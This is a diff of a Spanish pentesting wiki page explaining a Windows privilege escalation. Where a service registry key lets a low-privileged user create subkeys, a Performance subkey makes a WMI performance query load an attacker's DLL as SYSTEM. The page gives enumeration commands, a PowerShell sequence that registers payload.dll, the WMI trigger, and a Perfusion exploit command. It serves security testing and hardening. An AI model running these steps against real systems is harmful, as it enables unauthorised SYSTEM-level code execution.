@@ -1,28 +1,106 @@
+# AppendData/AddSubdirectory Permission over Service Registry
+
 {{#include ../../banners/hacktricks-training.md}}
 
-**La publicación original es** [**https://itm4n.github.io/windows-registry-rpceptmapper-eop/**](https://itm4n.github.io/windows-registry-rpceptmapper-eop/)
+**El post original es** [**https://itm4n.github.io/windows-registry-rpceptmapper-eop/**](https://itm4n.github.io/windows-registry-rpceptmapper-eop/)
 
-## Resumen
+## Summary
 
-Se encontraron dos claves de registro que eran escribibles por el usuario actual:
+Si solo tienes **`Create Subkey`** / **`AppendData/AddSubdirectory`** sobre una clave de registro de un service, esto sigue siendo una buena pista de privesc. Normalmente **no puedes** sobrescribir directamente `ImagePath`, `ServiceDll` u otros valores existentes, pero aun así puedes crear una clave hija **`Performance`** bajo:
 
-- **`HKLM\SYSTEM\CurrentControlSet\Services\Dnscache`**
 - **`HKLM\SYSTEM\CurrentControlSet\Services\RpcEptMapper`**
+- **`HKLM\SYSTEM\CurrentControlSet\Services\Dnscache`**
+- Cualquier otra clave **`HKLM\SYSTEM\CurrentControlSet\Services\<service>`** donde tu token tenga **`KEY_CREATE_SUB_KEY`**
 
-Se sugirió verificar los permisos del servicio **RpcEptMapper** utilizando la **GUI de regedit**, específicamente la pestaña **Permisos Efectivos** en la ventana de **Configuración de Seguridad Avanzada**. Este enfoque permite evaluar los permisos otorgados a usuarios o grupos específicos sin necesidad de examinar cada Entrada de Control de Acceso (ACE) individualmente.
+El truco es que Windows aún soporta el modelo de registro heredado **PerfLib V1**. Si un service tiene una subclave **`Performance`**, Windows puede cargar una DLL desde allí cuando un consumidor de performance counter solicita datos.
 
-Una captura de pantalla mostró los permisos asignados a un usuario con pocos privilegios, entre los cuales el permiso **Crear Subclave** era notable. Este permiso, también conocido como **AppendData/AddSubdirectory**, corresponde con los hallazgos del script.
+Según la documentación de Microsoft, el registro mínimo es:
+```text
+HKLM\SYSTEM\CurrentControlSet\Services\<service>\Performance
+Library = C:\Path\payload.dll
+Open    = OpenPerfData
+Collect = CollectPerfData
+Close   = ClosePerfData
+```
+Así que la conclusión ofensiva es: **no descartes un hallazgo en el service registry solo porque solo obtuviste `CreateSubKey` en lugar de `SetValue`**.
 
-Se observó la incapacidad de modificar ciertos valores directamente, pero la capacidad de crear nuevas subclaves. Un ejemplo destacado fue un intento de alterar el valor **ImagePath**, que resultó en un mensaje de acceso denegado.
+## Por qué esto es suficiente para code execution
 
-A pesar de estas limitaciones, se identificó un potencial para la escalada de privilegios a través de la posibilidad de aprovechar la subclave **Performance** dentro de la estructura de registro del servicio **RpcEptMapper**, una subclave que no está presente por defecto. Esto podría permitir el registro de DLL y la monitorización del rendimiento.
+La subkey `Performance` normalmente **no** existe por defecto en estos services, así que **`KEY_CREATE_SUB_KEY`** es el primitive que necesitas. Una vez que la key existe y contiene `Library`/`Open`/`Collect`/`Close`, cualquier **performance counter consumer** puede disparar la carga de la DLL.
 
-Se consultó documentación sobre la subclave **Performance** y su utilización para la monitorización del rendimiento, lo que llevó al desarrollo de una DLL de prueba de concepto. Esta DLL, que demuestra la implementación de las funciones **OpenPerfData**, **CollectPerfData** y **ClosePerfData**, fue probada a través de **rundll32**, confirmando su éxito operativo.
+Algunos detalles importantes:
 
-El objetivo era forzar al **servicio de Mapeo de Puntos de Finalización RPC** a cargar la DLL de rendimiento creada. Las observaciones revelaron que la ejecución de consultas de clase WMI relacionadas con Datos de Rendimiento a través de PowerShell resultó en la creación de un archivo de registro, lo que permitió la ejecución de código arbitrario bajo el contexto de **SISTEMA LOCAL**, otorgando así privilegios elevados.
+- El valor **`Library`** puede apuntar a una **ruta completa de DLL**.
+- La DLL debe exportar **`OpenPerfData`**, **`CollectPerfData`** y **`ClosePerfData`** y devolver `ERROR_SUCCESS`.
+- El código se ejecuta en el **contexto del consumer**, **no necesariamente en el proceso del vulnerable service**.
+- En el caso clásico de `RpcEptMapper` / `Dnscache`, una **WMI performance query** puede hacer que **`wmiprvse.exe`** cargue la DLL como **`NT AUTHORITY\SYSTEM`**.
 
-Se subrayaron la persistencia y las posibles implicaciones de esta vulnerabilidad, destacando su relevancia para estrategias de post-explotación, movimiento lateral y evasión de sistemas antivirus/EDR.
+Por eso este primitive es fácil de pasar por alto durante el triage: la parent service key no es "fully writable", pero aun así se puede weaponize.
 
-Aunque la vulnerabilidad se divulgó inicialmente de manera no intencionada a través del script, se enfatizó que su explotación está restringida a versiones antiguas de Windows (por ejemplo, **Windows 7 / Server 2008 R2**) y requiere acceso local.
+## Quick enumeration
 
+Manual spot-check con **AccessChk**:
+```bash
+accesschk.exe -k -w hklm\system\currentcontrolset\services\rpceptmapper
+accesschk.exe -k -w hklm\system\currentcontrolset\services\dnscache
+```
+Ejemplo de PowerShell para buscar principals con pocos privilegios con **`CreateSubKey`** en claves de servicios:
+```powershell
+Get-ChildItem HKLM:\SYSTEM\CurrentControlSet\Services | ForEach-Object {
+$weak = (Get-Acl $_.PSPath).Access | Where-Object {
+$_.AccessControlType -eq 'Allow' -and
+($_.RegistryRights -band [System.Security.AccessControl.RegistryRights]::CreateSubKey) -eq [System.Security.AccessControl.RegistryRights]::CreateSubKey -and
+$_.IdentityReference -match 'Users|Authenticated Users|INTERACTIVE|Network Configuration Operators'
+}
+if ($weak) {
+[pscustomobject]@{Service=$_.PSChildName; Principals=($weak.IdentityReference -join ', '); Rights=($weak.RegistryRights -join '; ')}
+}
+}
+```
+Herramientas útiles:
+
+- **PrivescCheck**: `Get-ModifiableRegistryPath` fue creado específicamente para detectar esta clase de problema.
+- **SharpUp**: `SharpUp.exe audit ModifiableServiceRegistryKeys`
+- **Perfusion**: automatiza el drop de DLL, el registro `Performance`, el trigger WMI, la duplicación de token y la limpieza en targets legacy vulnerables (por ejemplo: `Perfusion.exe -c cmd -i -k Dnscache`).
+
+## Flujo de abuse
+
+Crear la subkey `Performance` y completar los valores requeridos:
+```powershell
+$svc = 'RpcEptMapper' # or Dnscache / NetBT / another vulnerable service
+$k = "HKLM:\SYSTEM\CurrentControlSet\Services\$svc\Performance"
+New-Item $k -Force | Out-Null
+New-ItemProperty $k -Name Library -Value "$pwd\payload.dll" -PropertyType String -Force | Out-Null
+New-ItemProperty $k -Name Open -Value 'OpenPerfData' -PropertyType String -Force | Out-Null
+New-ItemProperty $k -Name Collect -Value 'CollectPerfData' -PropertyType String -Force | Out-Null
+New-ItemProperty $k -Name Close -Value 'ClosePerfData' -PropertyType String -Force | Out-Null
+```
+Luego, activa un consumidor de rendimiento **privileged**. Un ejemplo clásico es una consulta WMI sobre clases `Win32_Perf*`:
+```powershell
+powershell.exe -NoProfile -Command "Get-WmiObject -List | Where-Object { $_.Name -like 'Win32_Perf*' } | Out-Null"
+```
+Notas operativas:
+
+- Lanzar **`perfmon.exe`** es útil para verificar que el registro del contador es correcto, pero eso normalmente solo carga la DLL en **tu propio contexto de usuario**.
+- Para una LPE real, dispara un consumidor **privilegiado** como **WMI**.
+- Si estás escribiendo tu propio exploit, lanzar `cmd.exe` directamente desde dentro de la DLL normalmente te deja con una shell en **session 0**. `Perfusion` resuelve esto duplicando el token privilegiado en un proceso que fue creado en estado suspended en la sesión del atacante.
+- Haz coincidir la arquitectura de la DLL con el consumidor objetivo (**x64 en sistemas x64**).
+
+## Notas de versión / desarrollos recientes
+
+Históricamente, las weak keys integradas eran:
+
+- **Windows 7 / Windows Server 2008 R2**: `RpcEptMapper` y `Dnscache`
+- **Windows 8 / Windows Server 2012**: `RpcEptMapper`
+
+`Perfusion` señala que las actualizaciones de **abril de 2021** eliminaron la ruta de explotación fácil en **Windows 8 / Windows Server 2012** actualizado, mientras que **Windows 7 / Windows Server 2008 R2** seguía siendo explotable a través de **`Dnscache`**.
+
+Este primitive no es **solo histórico**. En **enero de 2025**, Microsoft corrigió un problema relacionado de AD DS en el que miembros de **`Network Configuration Operators`** podían crear subkeys bajo **`Dnscache`** y **`NetBT`**, y la misma idea de **registro de DLL de Performance-counter** podía reutilizarse para llegar a **SYSTEM** en sistemas soportados.
+
+Así que la lección moderna es genérica: siempre que un principal con pocos privilegios tenga **`CreateSubKey`** sobre **`HKLM\SYSTEM\CurrentControlSet\Services\<service>`**, comprueba si una child key **`Performance`** es suficiente antes de descartar el hallazgo.
+
+## References
+
+- [Microsoft Learn - Creating the Application's Performance Key](https://learn.microsoft.com/en-us/windows/win32/perfctrs/creating-the-applications-performance-key)
+- [BirkeP - Active Directory Domain Services Elevation of Privilege Vulnerability (CVE-2025-21293)](https://birkep.github.io/posts/Windows-LPE/)
 {{#include ../../banners/hacktricks-training.md}}
